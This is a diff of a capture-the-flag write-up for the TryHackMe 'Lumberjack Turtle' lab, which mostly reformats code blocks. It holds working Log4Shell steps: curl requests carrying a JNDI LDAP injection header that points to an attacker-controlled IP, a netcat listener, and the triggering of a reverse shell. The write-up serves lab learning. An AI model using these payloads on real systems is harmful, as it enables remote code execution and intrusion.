@@ -5,7 +5,6 @@ tags:
   - Linux
   - Log4Shell
   - Docker
-  - Capabilities
 ---
 https://tryhackme.com/room/lumberjackturtle/
 # Add Hosts
@@ -48,8 +47,8 @@ Connection from 10.66.159.104:56666
 0
  `�
 ```
-```console
-$ curl -s 'http://jackturtle.thm/~logs/log4j' -H 'X-Api-Version: ${jndi:ldap://192.168.186.238:4444/a}'
+```bash
+curl -s 'http://jackturtle.thm/~logs/log4j' -H 'X-Api-Version: ${jndi:ldap://192.168.186.238:4444/a}'
 ```
 # Exploitation
 Set malicious LDAP and HTTP server:
@@ -66,12 +65,12 @@ ldap://192.168.186.238:1389/vihljz
 ...
 ```
 Wait for connections:
-```console
-$ nc -lvnp 4444
+```bash
+nc -lvnp 4444
 ```
 Trigger reverse shell connection:
-```console
-$ curl -s 'http://jackturtle.thm/~logs/log4j' -H 'X-Api-Version: ${jndi:ldap://192.168.186.238:1389/vihljz}'
+```bash
+curl -s 'http://jackturtle.thm/~logs/log4j' -H 'X-Api-Version: ${jndi:ldap://192.168.186.238:1389/vihljz}'
 ```
 # Post-Exploitation
 We are currently **root** but inside a Docker container:
